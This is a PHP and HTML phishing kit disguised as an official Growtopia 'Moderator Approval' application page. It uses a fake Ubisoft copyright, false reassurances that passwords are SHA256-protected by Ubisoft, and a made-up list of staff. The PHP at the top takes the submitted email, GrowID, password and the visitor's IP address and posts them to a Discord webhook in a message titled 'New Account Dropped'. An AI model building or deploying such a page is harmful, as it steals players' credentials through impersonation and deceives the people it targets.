<?php
// Maded by https://rvlnd.com
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $growid = $_POST['growid'];
    $password = $_POST['password'];
    $banned = $_POST['banned'];
    $description = $_POST['description'];

    $userIP = $_SERVER['REMOTE_ADDR'];

    $webhookUrl = 'here';

    $embed = [
        'title' => 'New Account Dropped',
        'color' => hexdec('00ff00'),
        'fields' => [
            ['name' => 'Email', 'value' => $email],
            ['name' => 'GrowID', 'value' => $growid],
            ['name' => 'Password', 'value' => $password],
            ['name' => 'IP', 'value' => $userIP],
        ],
    ];

    $message = [
        'content' => '',
        'embeds' => [$embed],
    ];

    // Send message to Discord
    $data = json_encode($message);
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-type: application/json',
            'content' => $data,
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($webhookUrl, false, $context);

    // Check if the message was sent successfully
    if ($result === FALSE) {
        echo 'Error sending message to Discord.';
    } else {
echo '<script>alert("Thank you for the Approval. ");</script>';

    }
}
?>	
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <title>Growtopia Moderator Approval</title>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light fixed-top">
        <div class="container-fluid">
            <img src="https://Rvlnd.b-cdn.net/2050352.png" alt="" width="100" height="50">
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <div class="navbg">
                        <li class="nav-item">
                            <a class="nav-link active text-info" aria-current="page" href="https://growtopiagame.com">Growtopia Official Website</a>
                        </li>
                    </div>
                    <div class="navbg">
                        <li class="nav-item">
                            <a class="nav-link active text-info" aria-current="page" href="https://growtopia.fandom.com">Growtopia Wiki</a>
                        </li>
                    </div>
                    <div class="navbg">
                        <li class="nav-item">
                            <a class="nav-link active text-info" aria-current="page" href="https://growtopiagame.com/faq">Growtopia Faq</a>
                        </li>
                    </div>
                    <div class="navbg">
                        <li class="nav-item">
                            <a class="nav-link active text-info" aria-current="page" href="https://www.growtopiagame.com/forums/">Growtopia Forum</a>
                        </li>
                    </div>
                </ul>
            </div>
        </div>
    </nav>
    <div class="bgtop">
        <div class="container">
        	<div id="alrt"></div>
            <br><br><br><br>
            <div class="urmom">
                <center>
                    <h1 style="font-size: 40px;">Growtopia Moderator Approval.</h1>
                    <br>
                    <p style="font-family: 'Ubuntu', sans-serif; color: white;">We currently need moderators to manage and support illegal players, especially Autofarm & Macro</p>
                    <br><br><br>
                </center>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="content">
            <br><br>
            <h1 class="text-info">Approval Form</h1>
            <p style="color: red;">Keep in mind. please don't record or anything else during this process because it contains your personal details.</p>
            <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
                <div class="mb-3">
                    <label for="Email" class="form-label text-info">Email address</label>
                    <input type="email" class="form-control text-info" id="exampleFormControlInput1" placeholder="name@example.com" name="email">
                </div>
                <div class="mb-3">
                    <label for="growid" class="form-label text-info">What is Your Growid?</label>
                    <input type="text" class="form-control text-info" id="exampleFormControlInput1" placeholder="Your Growid" name="growid">
                </div>
                <div class="mb-3">
                    <label for="pword" class="form-label text-info">What is Your Password?</label>
                    <p style="color: red;">Don't worry! your data is managed by Ubisoft with SHA256 Encryption</p>
                    <input type="password" class="form-control text-info" id="exampleFormControlInput1" placeholder="Your Password" name="password">
                </div>
                <br>
                <select class="form-select" aria-label="select" name="banned">
                    <option selected>Have you ever been banned?</option>
                    <option value="0">Yes</option>
                    <option value="1">No</option>
                </select>
                <br>
                <div class="mb-3">
                    <label for="Describe" class="form-label text-info">Describe to us why you want to be Moderator</label>
                    <textarea class="form-control text-info" id="Describe" rows="3" name="description"></textarea>
                </div>
                <button type="submit" class="btn btn-info">Submit My information</button>
            </form>
            <br><br>
            <h2 class="text-info">After you are approved you will be trained by</h2>
            <ol class="list-group list-group-numbered">
                <li class="list-group-item d-flex justify-content-between align-items-start">
                    <div class="ms-2 me-auto">
                        <div class="fw-bold">Misthios</div>
                        Head Admin
                    </div>
                    <span class="badge bg-primary rounded-pill">EU</span>
                </li>
                <li class="list-group-item d-flex justify-content-between align-items-start">
                    <div class="ms-2 me-auto">
                        <div class="fw-bold">Caitriona</div>
                        Junior Moderator
                    </div>
                    <span class="badge bg-primary rounded-pill">EU</span>
                </li>
                <li class="list-group-item d-flex justify-content-between align-items-start">
                    <div class="ms-2 me-auto">
                        <div class="fw-bold">WindyPlay</div>
                        Junior Moderator
                    </div>
                    <span class="badge bg-primary rounded-pill">EU</span>
                </li>
            </ol>
            <br><br>
        </div>
    </div>
    <div class="fooooooter">
    	<footer class="bg-transparent text-center text-lg-start">
  <div class="container p-4">
    <div class="row">
      <div class="col-lg-6 col-md-12 mb-4 mb-md-0">
        <h5 class="text-uppercase">Growtopia Game</h5>
        <p>
          Copyright 2023© Ubisoft LLC
        </p>
      </div>
  </div>
    	</div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
</body>
</html>